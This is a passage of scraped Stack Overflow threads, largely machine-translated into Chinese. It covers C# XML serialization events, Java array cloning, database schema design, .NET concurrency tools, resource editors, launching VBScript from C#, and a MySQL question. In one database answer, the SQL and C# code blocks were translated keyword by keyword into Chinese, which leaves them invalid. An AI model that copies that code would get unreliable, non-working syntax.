        cb = new AsyncCallback(OnXMLSerializing_Completed);
        IAsyncResult IAR = dd.BeginInvoke(stream, o, cb, dd);
        // This Delay Is Important Otherwise The Next Line Of Code(From Where Serialize Is Called)
        // Gets Executed Prior To Conclusion Of EndInvoke, Consequently Throwing Exception.
        while (IAR.IsCompleted == false) Thread.Sleep(1);
        /* ON Serialization Completed ie [ONSERIALIZED] */            
    }

    public object Deserialize(System.IO.Stream stream,Type ClassType)
    {
        XmlSerializer xx = new XmlSerializer(ClassType);

        /* ON De-Serialization  Beginning [ONDESERIALIZING] */
        dx = new del_xmlDeserializing(OnXMLDeserializing_Begin);
        IAsyncResult IAR_Begin = dx.BeginInvoke(null, null);
        dx.EndInvoke(IAR_Begin);
        /* ON De-Serialization  Beginning [ONDESERIALIZING] */

        /* ON De-Serialization  Completed [ONDESERIALIZED] */
        xd = new del_xmlDeserialized(xx.Deserialize);
        db = new AsyncCallback(OnXMLDeserialization_Completed);
        IAsyncResult IAR = xd.BeginInvoke(stream, db, xd);                
        // This Delay Is Important Otherwise The Next Line Of Code(From Where Serialize Is Called)
        // Gets Executed Prior To Conclusion Of EndInvoke ,Consequently Throwing Exception.
        while (IAR.IsCompleted == false) Thread.Sleep(1);
        return FinalDeserializedObject;
        /* ON De-Serialization  Completed [ONDESERIALIZED] */           
    }

    private void OnXMLDeserialization_Completed(IAsyncResult I)
    {
        del_xmlDeserialized Clone = (del_xmlDeserialized)I.AsyncState;
        FinalDeserializedObject = Clone.EndInvoke(I);
        OnDeserialized();            
    }

    public virtual void OnSerialized()
    {
        MessageBox.Show("Serialization Completed");
    }

    public virtual void OnDeserialized()
    {
        MessageBox.Show("Deserialization Completed");
    }

    private void OnXMLSerializing_Completed(IAsyncResult I)
    {
        del_xmlSerialized Clone = (del_xmlSerialized)I.AsyncState;
        Clone.EndInvoke(I);
        OnSerialized();           
    }

    private void OnXMLDeserializing_Begin()
    {
        //Thread.Sleep(5000);
        OnDeserializing();
    }

    public virtual void OnDeserializing()
    {
        MessageBox.Show("Beginning Deserialization");
    }

    private void OnXMLSerializing_Begin()
    {
        //Thread.Sleep(5000);
        OnSerializing();
    }

    public virtual void OnSerializing()
    {
        MessageBox.Show("Beginning Serialization");
    }        
} 
```

现在按名称创建另一个类`TotalRecall`并将该类继承`MyXMLSerializer`到这个类中，如下所示：

```
public class TotalRecall:MyXMLSerializer
{
    public override void OnSerialized()
    {
        MessageBox.Show("Yippeeee!!!!!,I Finally Managed To Wire [ONSERIALIZED] Event With XMLSerializer.My Code Upon XML Serialized[ONSERIALIZED] Goes Here..");            
        //base.OnSerialized();
    }

    public override void OnSerializing()
    {
        MessageBox.Show("Yippeeee!!!!!,I Finally Managed To Wire [ONSERIALIZING] Event With XMLSerializer.My Code Upon XML Serializing[ONSERIALIZING] Goes Here..");                        
        //base.OnSerializing();
    }

    public override void OnDeserializing()
    {
        MessageBox.Show("Yes!!!!!,I Finally Managed To Wire [ONDESERIALIZING] Event With XMLSerializer.My Code Upon XML De-Serializing[ONDESERIALIZING] Goes Here..");            
        //base.OnDeserializing();
    }

    public override void OnDeserialized()
    {
        MessageBox.Show("Yes!!!!!,I Finally Managed To Wire [ONDESERIALIZED] Event With XMLSerializer.My Code Upon XML De-Serialized[ONDESERIALIZED] Goes Here..");
        //base.OnDeserialized();
    }
} 
```

现在创建一个窗体（我创建了一个 Windows 窗体）。`Button1`使用名称和`Button2`（默认值）在其上创建两个按钮。我完整的表格代码是：

```
public partial class Form2 : Form
{
    public Form2()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        TotalRecall xx = new TotalRecall();
        Employee ee = new Employee();
        FileStream fs = File.Create("sss.xml");
        xx.Serialize(fs, ee, typeof(Employee));
        fs.Close();
        fs.Dispose();
    }

    private void button2_Click(object sender, EventArgs e)
    {
        TotalRecall xx = new TotalRecall();
        FileStream fs=File.OpenRead("sss.xml");
        Employee ee = (Employee)xx.Deserialize(fs, typeof(Employee));
        fs.Close();
        fs.Dispose();
    }
} 
```

请在我在此复制粘贴期间遗漏的任何地方包括命名空间。

# java - 在Java中深度克隆多维数组......？

> ID：200387
> 
> 赞同：8
> 
> 时间：2008-10-14T08:34:53.043
> 
> 标签：java, arrays, clone

我有两个具有推断大小的多维数组（实际上它们只是 2D）。如何深度克隆它们？这是我到目前为止所得到的：

```
public foo(Character[][] original){
    clone = new Character[original.length][];
    for(int i = 0; i < original.length; i++)
          clone[i] = (Character[]) original[i].clone();
} 
```

相等的测试`original.equals(clone);`吐出一个错误。为什么？:|

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-05-01T19:11:37.753

```
/**Creates an independent copy(clone) of the boolean array.
 * @param array The array to be cloned.
 * @return An independent 'deep' structure clone of the array.
 */
public static boolean[][] clone2DArray(boolean[][] array) {
    int rows=array.length ;
    //int rowIs=array[0].length ;

    //clone the 'shallow' structure of array
    boolean[][] newArray =(boolean[][]) array.clone();
    //clone the 'deep' structure of array
    for(int row=0;row<rows;row++){
        newArray[row]=(boolean[]) array[row].clone();
    }

    return newArray;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T08:48:30.537

您可能想查看[java.util.Arrays.deepEquals](http://java.sun.com/j2se/1.5.0/docs/api/java/util/Arrays.html)和[java.util.Arrays.equals](http://java.sun.com/j2se/1.5.0/docs/api/java/util/Arrays.html)方法。

恐怕`equals`数组对象的方法执行浅比较，并且不能正确（至少在这种情况下）比较内部`Character`数组。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-14T09:00:31.043

数组上的 equals() 方法是在 Object 类中声明的方法。这意味着它只会在对象相同的情况下返回 true。相同的意思是在CONTENT中不一样，但在MEMORY中相同。因此，当您在内存中复制结构时，数组上的 equals() 将永远不会返回 true。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T09:00:33.320

> 相等的测试 original.equals(clone); 吐出一句假话。为什么？:|

那是因为您正在使用`new Character[original.length][];`.

`Arrays.deepEquals(original,clone)`应该返回真。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-08-07T17:47:03.770

与带有示例的@Barak 解决方案（序列化和反序列化）相同（因为有些人无法理解并投反对票）

```
public static <T extends Serializable> T deepCopy(T obj)
{
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    try
    {
        ObjectOutputStream oos = new ObjectOutputStream(baos);

        // Beware, this can throw java.io.NotSerializableException 
        // if any object inside obj is not Serializable
        oos.writeObject(obj);  
        ObjectInputStream ois = new ObjectInputStream(
                                    new ByteArrayInputStream(baos.toByteArray()));
        return (T) ois.readObject();
    }
    catch (  ClassNotFoundException /* Not sure */
           | IOException /* Never happens as we are not writing to disc */ e)
    {
        throw new RuntimeException(e); // Your own custom exception
    }
} 
```

用法：

```
 int[][] intArr = { { 1 } };
    System.out.println(Arrays.deepToString(intArr)); // prints: [[1]]
    int[][] intDc = deepCopy(intArr);
    intDc[0][0] = 2;
    System.out.println(Arrays.deepToString(intArr)); // prints: [[1]]
    System.out.println(Arrays.deepToString(intDc)); // prints: [[2]]
    int[][] intClone = intArr.clone();
    intClone[0][0] = 4;

    // original array modified because builtin cloning is shallow 
    System.out.println(Arrays.deepToString(intArr)); // prints: [[4]]
    System.out.println(Arrays.deepToString(intClone)); // prints: [[4]]

    short[][][] shortArr = { { { 2 } } };
    System.out.println(Arrays.deepToString(shortArr)); // prints: [[[2]]]

    // deepCopy() works for any type of array of any dimension
    short[][][] shortDc = deepCopy(shortArr);
    shortDc[0][0][0] = 4;
    System.out.println(Arrays.deepToString(shortArr)); // prints: [[[2]]]
    System.out.println(Arrays.deepToString(shortDc)); // prints: [[[4]]] 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-10-14T09:23:50.480

我在jGuru 上找到了[克隆多维](http://www.jguru.com/faq/view.jsp?EID=20435)数组的答案：

```
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(this);
ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
ObjectInputStream ois = new ObjectInputStream(bais);
Object deepCopy = ois.readObject(); 
```

# asp.net - 请为我们的监控服务器推荐一个专业的keepalive解决方案

> ID：200390
> 
> 赞同：0
> 
> 时间：2008-10-14T08:37:01.153
> 
> 标签：asp.net, monitoring, sysadmin

我正在寻找一种可以安装在我们的监控服务器上的工具，它允许我们对我们的网站执行预定的请求，以防止它们关闭（asp.net）。

我不想使用 Web 服务，因为我们已经有一个专用的监控服务器。如果不使用一些丑陋的解决方法，我们的监控软件实际上无法做到这一点。

我可能可以自己写，但我的时间有点短。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T08:52:58.500

使用[wget for Windows](http://users.ugent.be/~bpuype/wget/)和计划任务怎么样？

# .htaccess - Find the page that the user intended to see

> ID：200393
> 
> 赞同：0
> 
> 时间：2008-10-14T08:38:04.427
> 
> 标签：.htaccess, mod-rewrite, http-status-code-404

I'm rebuilding a site with a lot of incoming links, and the URL structure is completely changing. I'm using the stock mod_rewrite solution to redirect all old links to new pages. However, as I'm sure a few links will slip through the net, I've built a small script that runs on my custom 404 page, to log the incoming visitors' referrer URL. This will help me track down any broken links.

In addition to referrer, is there also a way of logging the url that the user entered, or clicked that caused a 404? I ask this as referrer is obviously a bit 'hit & miss'.

I suspect not, but thought it worth a question.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T08:45:01.260

You could determine from the logs what happened a short time earlier for that user. The referrer alone may not always put you into the right context.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T08:48:55.793

You could maintain your old virtual folder structure during a transition period and put redirect pages in place to the new content. If the structure is changing very radically so that is not possible then you basically don't have enough information from the old URL's to direct them.

# database - 一桌还是多桌？

> ID：200394
> 
> 赞同：32
> 
> 时间：2008-10-14T08:39:06.313
> 
> 标签：database, database-design

我正在尝试设计一个应用程序来保存学术参考信息。问题是每种不同类型的参考资料（例如期刊文章、书籍、报纸文章等）都需要不同的信息。例如，期刊参考需要期刊标题和文章标题以及页码，而书籍需要出版商和出版日期，而期刊文章不需要。

因此，我应该将所有参考文献存储在数据库的一个表中，并且在它们不适用时将字段留空，还是应该有各种表，例如 BookReferences、JournalReferences、NewspaperReferences 并在每个表中放置适当的参考文献。那么问题将是它会使搜索所有参考文献变得更加困难，并且编辑可能必须更加独立地进行。

（顺便说一下，我计划在这个项目中使用 Ruby on Rails，但我怀疑这对这个设计问题有什么影响）

**更新：**

对此还有什么看法吗？我希望得到一个简单的答案，说一种特定的方法绝对被认为是“最好的”——但像往常一样，事情并不像这样简单。Single-Table Inheritance 选项看起来很有趣，但是我可以很容易地找到关于它的信息不多 - 我可能会在此站点上发布另一个关于此的问题。

我分为[Olvak 的回答](https://stackoverflow.com/questions/200394/one-table-or-many#200406)和[Corey 的回答](https://stackoverflow.com/questions/200394/one-table-or-many#200671)。Corey 的回答很好地说明了为什么 Olvak 不是最好的，但 Olvak 的回答很好地说明了为什么 Corey 不是最好的！我从来没有意识到这会如此困难......

任何进一步的建议非常感谢！

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2008-10-14T08:44:20.607

我会为所有参考提供一个表，但是像 BookReferences 等附加表用于元数据不适用于所有参考类型。

搜索和查询不会更困难 - 毕竟您可以像在单表解决方案中一样创建一个聚合所有信息的视图，然后进一步查询该视图。

将所有内容放在一个包含大量空值的表中似乎是更简单的解决方案，但实际上会带来很多麻烦。例如：使用单独的表，您可以定义每个 BookReference*需要哪些字段，但如果所有内容都在一个表中，则每个字段都必须是可空的，因此是可选的。*插入无效数据也会更容易，例如也错误地包含非空期刊名称的书籍参考。

编辑：有些人似乎害怕加入。*不要害怕加入！*如果您在多个查询中使用完全相同的连接确实会很乏味，但在这种情况下，连接应该在*视图*中定义，并且您的查询应该查询该视图。视图实际上是关系数据库中的基本抽象，您应该使用它们的原因与在代码中使用函数的原因相同：避免重复，以及封装和创建抽象。

编辑：有一些关于性能的评论。很难事先猜测 DB 模式的性能，因为它通常不直观。例如，几个表之间的连接很容易比单个表的全表扫描更快——这完全取决于查询的类型、数据的性质、可用的索引等等。此外，在许多数据库系统中，您可以使用物化视图等特性来优化不同查询的性能，而不会影响逻辑模型。恕我直言，“性能非规范化”如今主要是货物崇拜，除非您是 Google 或 Flickr。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2008-10-14T11:21:49.993

“一张大桌子让生活更轻松”：我已经看到了这样做的自然结果，作为一个 100 多列的表格，我可以告诉你，我发现使用它并不快乐。

主要问题是此类表的设计者倾向于忽略确保数据完整性所需的约束。例如，OP 说：

> 期刊参考需要期刊标题和文章标题以及页码，而书籍需要出版商和出版日期，而期刊文章不需要

...这意味着以下约束：

```
CONSTRAINT a_journal_must_have_a_journal_title
   CHECK ( type <> 'journal' OR journal_title IS NOT NULL );

CONSTRAINT a_journal_must_have_an_article_title 
   CHECK ( type <> 'journal' OR article_title IS NOT NULL );

CONSTRAINT a_journal_must_have_a_page_number 
   CHECK ( type <> 'journal' OR page_number IS NOT NULL );

CONSTRAINT a_journal_cannot_have_a_publisher 
   CHECK ( type <> 'journal' OR publisher IS NULL );

CONSTRAINT a_journal_cannot_have_a_publication_date 
   CHECK ( type <> 'journal' OR publication_date IS NULL );

CONSTRAINT a_book_cannot_have_a_journal_title 
   CHECK ( type <> 'book' OR journal_title IS NULL );

CONSTRAINT a_book_cannot_have_a_article_title 
   CHECK ( type <> 'book' OR article_title IS NULL );

CONSTRAINT a_book_cannot_have_a_page_number 
   CHECK ( type <> 'book' OR page_number IS NULL );

CONSTRAINT a_book_must_have_a_publisher 
   CHECK ( type <> 'book' OR publisher IS NOT NULL );

CONSTRAINT a_jbook_must_have_a_publication_date 
   CHECK ( type <> 'book' OR publication_date IS NOT NULL ); 
```

...我怀疑这只是冰山一角！

我希望在编写了数百个这样的约束之后，设计者可能会对所有那些可为空的列重新考虑 :)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-14T12:58:02.217

我的建议是从正确设计数据库开始，即使用规范化来确保表只包含关于一件事（书籍、日记等）的数据，并且属性存储在正确的表中。

如果将来它会产生性能问题，您可以将其反规范化为更少的表，但这不太可能成为问题，除非您拥有庞大的数据库。

创建一个包含所有引用的公共属性的表。

创建单独的表来保存特定于每种引用类型的属性。

另一个问题是你是否会有很多对单个作品的引用，例如对特定期刊的数百个引用。然后，规范化会建议您有一个包含期刊（标题、作者、期刊）的表、一个包含特定于期刊（文章、页面）的参考信息的表，以及另一个包含所有参考文献通用数据的表（参考日期，参考类型）。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-14T08:45:29.730

添加需要额外字段的新引用类型时，具有“类型”字段的单个表会出现问题。扩展类型字段值没有问题，但您必须向表中添加列，为所有当前行填充默认值等。

拥有单独的表将使添加新的引用类型变得非常容易（并自动为其生成一个表单！）并且搜索也不会变得更加困难。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-14T09:34:09.900

Rails supports Single-Table inheritance and Polymorphic ActiveRecord types. I would suggest looking into these - ActiveRecord has some opinions on how the database should be structured.

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-10-14T10:33:49.840

I think you have to look ahead at what the SQL will look like for each of the solutions. If you go through that excercise, then you'll find that putting everything in one table is the easiest to code and will probably lead to having the best performance. It's easier to separate out the things you want from one table then it is to put things together from multiple tables.

Lets say my-one-big-table looks like this:

1 id
2 type
3 field-common-to-book-and-journal
4 field-specific-to-book
5 field-specific-to-journal

If I am just interested in books, I can create a view, or just plain sql, like this:

```
create view book as  
select id, field_common-to-book-and-journal, field-specific-to-book
from my-one-big-table
where type = 'book' 
```

So, it's easy to simulate that the data is in separate tables when I want to.

But, if I start off by putting the data in seperate tables then I'll end up writing SQL like this:

```
select id, field-common-to-book-and-journal from books
union
select id, field-common-to-book-and-journal from journal-articles
union
.... etc, for each type 
```

I don't know about other databases, but doing unions in SQL Server can be costly and there are restrictions when working with datatypes like ntext.

If you follow olavk's advice then your SQL for combining types in one query would end up looking like this:

```
select 
    common.id, 
    common.field-common-to-book-and-journal, 
    book.field-specific-to-book 
    journal.field-specific-to-journal
from common-table common
left outer join book-specific-table book on 
left outer join journal-specific-table journal on
... etc, for each type 
```

I've worked with systems that used all three of these ways and by far, life is easier with the one big table.

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-14T13:40:01.540

如果你经常想同时查询多种类型的引用，大表是一种更高效的方法。如果您通常一次只需要抓取一个，那么在连接效率方面您损失的很少。

如果您选择使用单表路由，请确保在表上放置触发器，以执行每种数据类型的数据完整性规则。您将需要它，因为您不能依赖于使字段成为必填项。

拥有单独的表的一个问题是，直到运行时您才知道需要加入哪些表。这使您进入我不喜欢的动态 SQl 领域（出于安全性、效率和维护原因），或者使您对可能需要或可能不需要的表进行左连接，这是低效的。

另一种可能性是将整个参考字符串存储在一个更大的字段中，并在连接记录并将信息发送到数据库之前使用用户界面检查以确保所有必需的部分都在那里。对于大多数需要所有信息但如果只需要提取部分数据的查询来说，这将是迄今为止最快的查询。它还依赖于通过用户界面插入的所有数据，这对您来说可能是也可能不是。老实说，我看不出你需要在哪里单独列出这些信息，所以这就是我可能会采取的方法。但我不知道您的业务规则，所以请持保留态度。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-14T11:03:50.717

还有另一种选择：不是我完全赞同的，但它仍然是另一种选择：

使用三个表：

```
refs (id, title, refType)
-- title of the reference, and what type of reference it is

fieldDef (id, fieldName, refType, dataType)
-- name of the field, which reference types it applies to, and
-- what type of data is stored in these fields (ISDN number, date, etc)

fields (refId, fieldId, value)
-- where you actually add data to the references. 
```

`refType`可以是引用的类型，如果您将其设为整数，其值以 2 的幂（1、2、4、8...）递增，则可以将它们加在一起以在 fieldDef 表中生成位掩码。

**优点**：非常简单且可扩展。如果您想出另一种类型的引用，或现有引用类型的新字段类型，则可以非常快速地添加它。可以为每种参考类型自动生成表格。所有数据都存储在一个地方，这意味着您不需要为[CRUD 操作跟踪多个模式](http://en.wikipedia.org/wiki/Create,_read,_update_and_delete)*（模式？）*。

**缺点**：这是制作 The Daily WTF 的素材。Select 语句可能会变得非常混乱和复杂。数据库无法执行类型检查（例如：日期等），并且通用“值”字段不会针对存储在其中的数据进行优化。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-10-14T11:32:00.627

我不觉得加入表格的需要特别乏味。我会在这里采取更规范的方法。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-14T08:42:21.237

我的建议是一张表和一个“类型”字段

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-14T08:44:36.050

您在询问数据库规范化。[Jeff Atwood 在他的帖子Maybe Normalizing Is not Normal](http://www.codinghorror.com/blog/archives/001152.html)中写道。这是一个很好的阅读。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-14T12:12:05.197

我过去最终做的是使用子类别：有一个包含所有*公共*字段的表，然后是几个可以与“核心”表具有零或一关系的表。

下面的例子类似于我们在“野外”使用的东西；它基本上构建了一个分层数据结构，其中每个节点可能是一个文件夹或文档：

```
创建表节点（
  Id int 身份主键，
  ParentId int null 引用 Node.ParentId,
  名称 varchar(50) 不为空，
  说明 varchar(max) null
)

创建表文档（
  Id int 主键引用 Node.Id,
  FileExtension char(3) 不为空，
  MimeType varchar(50) 不为空，
  ContentLength bigint 不为空，
  FilePathOnDisk varchar(255)
)

创建表文件夹 (
  Id int 主键引用 Node.Id,
  ReadOnly 位不为空
)

```

所以你的`GetFolder`sproc 会做：

```
选择 n.Id、n.ParentId、n.Name、n.Description、f.ReadOnly
从节点 n
加入文件夹 f ON n.Id = f.Id
其中 f.Id = @Id

```

这很好地转化为基于类的继承：

```
公共类文件夹：节点
{
  公共布尔 IsReadOnly { 获取；放; }
  ...ETC
}

```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-10-14T14:06:38.897

Olavk 提出了很好的观点，Corey 给出了非常详细的解释。不过，阅读 Corey 的信息，我对 Olavk 的回答有了一个结论。请记住，根据您对信息的处理方式，您最终可能会进行 2 阶段查询。找到该项目，然后针对每个参考，直接选择感兴趣的内容。

还要考虑将所有内容存储在多个表中并从单个表中读取它的想法。我为我拥有的大型数据库执行此操作，其中大多数查询都需要某些公共信息，但仍然需要完整的多表布局。插入被它们启动的触发器减慢了一点（在我的情况下，每个文件一个，每个文件负责插入多达一百万行），但我后来的选择查询可以从几分钟到个位数秒。

数据仓库:)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-09-25T16:28:04.913

前段时间我和我的上级讨论过这些问题。当然，我无法证明“**分层多表**方法”（参见[olavk 的回答](https://stackoverflow.com/questions/200394/one-table-or-many#200406)）更好，但我感觉到了！我总是会选择这种方法。一个包含实体共有的所有字段的根表，以及 1-1 个包含它们不共有的字段的子表。如果需要，这种方法可以扩展到更多的子表，只要业务逻辑和其他实体有一些东西就可以了。也就是说，我认为没有必要在这方面做得过火。

我也反对在没有根表的情况下创建**单独的“子”表**，其中每个表都有相同字段的副本。我认为[Corey 的回答](https://stackoverflow.com/questions/200394/one-table-or-many#200671)暗示了这种方法是一个糟糕的多表模型的一个例子，他也批评了它。我想补充一点，必须编写连接不是主要问题。这根本不是问题，因为大多数数据库查询都有很多连接，这是正常的事情。与其他表建立关系很困难——您总是需要一个 Id 和一个 TypeId 来知道哪个表链接到它。在根表的情况下，您只需要 Id。

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2008-10-14T13:52:25.027

两者怎么样？**有你的蛋糕，也吃吧！**

在“一个大表”和“完全规范化”的数据库之间还有另一种选择，它真正结合了两全其美：您可以使用称为[物化视图](http://en.wikipedia.org/wiki/Materialized_view)的东西，它们就像视图一样灵活，您可以查询根据需要创建许多表，设置所有连接等，但它们也像表一样，结果实际上存储在表中。

这样做的好处是，一旦您设置了它并决定何时刷新它（每次底层表 sis 更改，或者可能每晚一次），您就不必再担心它了。您可以像查询一张大表一样查询物化视图（因为它是），并且性能会很快（比使用它后面的 select 语句更快）。最重要的是，您不必为维护数据完整性而烦恼。这就是数据库要处理的。

如果您没有开箱即用的数据库支持此功能，您仍然可以通过每天晚上将视图结果构建一个表格作为批处理作业来使用此想法。

# c# - 有哪些工具可用于测试多线程 .net 代码？

> ID：200402
> 
> 赞同：16
> 
> 时间：2008-10-14T08:41:09.710
> 
> 标签：c#, .net, multithreading, unit-testing

在测试多线程 .net 代码时，是否有任何工具可以帮助查找竞争条件？我正在寻找与 IBM 的Java [ConTest](http://www.alphaworks.ibm.com/tech/contest)工具具有类似功能的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T08:52:44.537

[Typemock Racer](http://docs.typemock.com/racer/##RacerHelp.chm/html/4744c118-5744-4885-a3d0-8433d5f8ccc7.htm)可能是您正在寻找的东西，但我没有使用它 - 我只记得一些关于死锁的事情 :)

或者这个：[死锁检测器](http://www.lockexplorer.com/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-17T14:54:54.290

微软研究院的这个[公告](http://research.microsoft.com/projects/CHESS/)听起来就像他们有一个工具可以做我想要的。不幸的是，目前还没有.net 版本，但已经计划好了。引用该网站：

> CHESS 是一种自动化工具，用于通过系统探索线程调度来查找多线程软件中的错误。它发现错误，例如数据争用、死锁、挂起和数据损坏导致的访问违规，这些是当前测试工具极难发现的。一旦 CHESS 发现错误，它会提供导致错误的程序的完全可重复执行，从而极大地帮助调试过程。此外，CHESS 提供了一种适用于多线程程序的有价值且新颖的测试覆盖概念。CHESS 可以使用现有的并发测试用例，因此易于部署。开发人员和测试人员都应该发现 CHESS 很有用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-30T15:47:36.567

您看过[Debug Inspector](http://www.debuginspector.com) (www.debuginspector.com) 吗？

它确实存在托管和非托管死锁，涵盖了 WaitForSingleObject 和 WaitForMultipleObjects，适用于 XP 和 Vista

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-30T17:41:26.743

有一个很棒的 windbg 扩展，由 Steve Johnson 编写，名为 sosex，它有一个死锁查找命令。[您可以在http://www.stevestechspot.com/downloads/sosex_32.zip](http://www.stevestechspot.com/downloads/sosex_32.zip)找到它，您可以在此处阅读更多相关信息：http: [//www.stevestechspot.com/SOSEXANewDebuggingExtensionForManagedCode.aspx](http://www.stevestechspot.com/SOSEXANewDebuggingExtensionForManagedCode.aspx) 和此处：[http://www .stevestechspot.com/SOSEXUpdatedV11Available.aspx](http://www.stevestechspot.com/SOSEXUpdatedV11Available.aspx)。

# command-line - 任何人都知道用于托管 win32 exes/dlls 的免费/便宜的命令行资源编辑器

> ID：200403
> 
> 赞同：4
> 
> 时间：2008-10-14T08:41:10.893
> 
> 标签：command-line, editor, resources

有人推荐我使用[“Resource Tuner 控制台”](http://www.heaventools.com/command-line_resource_editor.htm)，但它有点超出我的价格范围。

我正在寻找可以从 nant 构建脚本启动的东西，并告诉我用我[之前的问题](https://stackoverflow.com/questions/191812/how-can-i-create-a-custom-property-for-my-assembly)中描述的附加属性来标记一个 exe 。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-09-12T03:34:28.137

[使用ResourceLib](http://resourcelib.codeplex.com/)构建 NANT 任务或小程序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-11-22T10:49:15.720

资源黑客可以在这里找到，顺便说一句：[http ://www.angusj.com/resourcehacker/](http://www.angusj.com/resourcehacker/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2010-01-21T18:19:51.513

我想我刚刚找到了我的（可能还有你的）最终解决方案：

verpatch /va foodll.dll %VERSION% %FILEDESCR% %COMPINFO% %PRODINFO% %BUILDINFO%

可在[http://www.codeproject.com/KB/install/VerPatch.aspx?msg=3207401获得](http://www.codeproject.com/KB/install/VerPatch.aspx?msg=3207401)

免费提供**完整源**代码（代码项目开放许可证 (CPOL) 许可证）

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-10-29T15:39:06.560

嗨，我的名字是 Archit 和几个 monts 年龄我觉得同样的问题......现在，有很多工具可以给你命令行编辑，资源黑客：免费和好的一个，它提供脚本和保存资源通过帮助文件在哪里你得到了很多关于这方面的例子，顺便说一下，你只要求便宜或免费的公用事业，但是如果你想要更多的公用事业，有几个收费可以有效地执行（不是免费的）给我打电话......是的，大部分付费资源编辑器工具免费提供命令行编辑.....意味着您可以下载 trail 并完全免费使用 cmd 行编辑器....

# c# - How to call a VBScript file in a C# application?

> ID：200422
> 
> 赞同：37
> 
> 时间：2008-10-14T08:49:28.787
> 
> 标签：c#, .net, asp.net, .net-2.0, vbscript

I need to call a [VBScript](http://en.wikipedia.org/wiki/VBScript) file (.vbs file extension) in my C# Windows application. How can I do this?

There is an add-in to access a VBScript file in Visual Studio. But I need to access the script in code behind. How to do this?

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2008-10-14T08:53:04.270

The following code will execute a VBScript script with no prompts or errors and no shell logo.

```
System.Diagnostics.Process.Start(@"cscript //B //Nologo c:\scripts\vbscript.vbs"); 
```

A more complex technique would be to use:

```
Process scriptProc = new Process();
scriptProc.StartInfo.FileName = @"cscript"; 
scriptProc.StartInfo.WorkingDirectory = @"c:\scripts\"; //<---very important 
scriptProc.StartInfo.Arguments ="//B //Nologo vbscript.vbs";
scriptProc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; //prevent console window from popping up
scriptProc.Start();
scriptProc.WaitForExit(); // <-- Optional if you want program running until your script exit
scriptProc.Close(); 
```

Using the `StartInfo` properties will give you quite granular access to the process settings.

You need to use [Windows Script Host](http://en.wikipedia.org/wiki/Windows_Script_Host) if you want windows, etc. to be displayed by the script program. You could also try just executing `cscript` directly but on some systems it will just launch the editor :)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2011-06-07T13:24:32.577

Another approach is to create a VB.NET Class Library project, copy your VBScript code into a VB.NET Class file, and reference the VB.NET Class Library from your C# program.

You will need to fix-up any differences between VBScript and VB.NET (should be few).

The advantage here, is that you will run the code in-process.

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-02-28T16:35:39.997

This is a permissions issue. Your application appPool must be running at the highest permission level to do this in 2008\. The Identity must be Administrator.

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-14T08:56:46.447

You mean you try to run a vbs file from C#?

It can be done like [running any other program from C# code](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.start(VS.80).aspx):

```
Process.Start(path); 
```

But you have to make sure that it won't ask for anything, and it is running with the command line version of the interpreter:

```
Process.Start("cscript path\\to\\script.vbs"); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-09-27T10:10:37.240

For the benefit of searchers, I found this [post](https://social.microsoft.com/Forums/en-US/9f5505d3-ab39-4f66-9ce5-95a7af432d22/passing-a-parameter-from-a-c-form-to-a-vbscript-and-executing-script?forum=Offtopic), which gives a clear answer (esp if you have parameters). Have tested it - seems to work fine.

```
string scriptName = "myScript.vbs"; // full path to script
int abc = 2;
string name = "Serrgggio";

ProcessStartInfo ps = new ProcessStartInfo();
ps.FileName = "cscript.exe";
ps.Arguments = string.Format("\"{0}\" \"{1}\" \"{2}\"", scriptName, abc, name);
//This will equate to running via the command line:
// > cscript.exe "myScript.vbs" "2" "Serrgggio"
Process.Start(ps); 
```

# mysql - 从另一个表更新列 - mySQL 3.5.2

> ID：200430
> 
> 赞同：1
> 
> 时间：2008-10-14T08:54:49.480
> 
> 标签：mysql, database, sql-update

我尝试了几种方法来从另一个表更新 mySQL 数据库表中的列，但没有任何运气。

我在某处读到版本 3.5.2 不支持多表更新，我需要基于代码的解决方案 - 对吗？

如果没有，任何人都可以使用 sql 指出我正确的方向吗？

```
